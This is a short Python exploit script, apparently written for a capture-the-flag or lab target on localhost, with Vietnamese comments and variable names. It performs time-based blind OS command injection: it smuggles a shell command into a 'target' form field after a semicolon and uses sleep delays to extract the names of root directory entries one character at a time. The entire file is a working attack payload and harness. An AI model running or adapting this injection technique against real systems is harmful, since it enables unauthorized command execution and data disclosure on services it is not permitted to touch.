import requests
import time
char = "123456789_.}{qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"
ket_qua = ""
for i in range(1 , 20):
    folder = ""
    print(f"Dang kiem tra dong so {i} cot {10}, Ki tu dang kiem tra la {""}. Ket qua tim duoc la : {"                      "}", end="\r" ,)
    for j in range(1,  15):
        for c in char:
            url = "http://localhost:3007"
            data = {
                "command": "backup",
                "target": f"facebook --help;ket_qua=$(ls / | head -n {i}| tail -n 1 | cut -c{j}) ;if [ \"$ket_qua\" = \"{c}\" ]; then sleep 1 ;else sleep 0;fi #"
            }
            print(f"Dang kiem tra dong so {i} cot {j}, Ki tu dang kiem tra la {c}. Ket qua tim duoc la : {folder}", end="\r" ,)
            start = time.time()
            response = requests.post(url=url, data=data)
            end = time.time()
            if round(end - start) == 1:
                folder += c
    ket_qua += " " +  folder
print("Ket qua cuoi cung la" + ket_qua)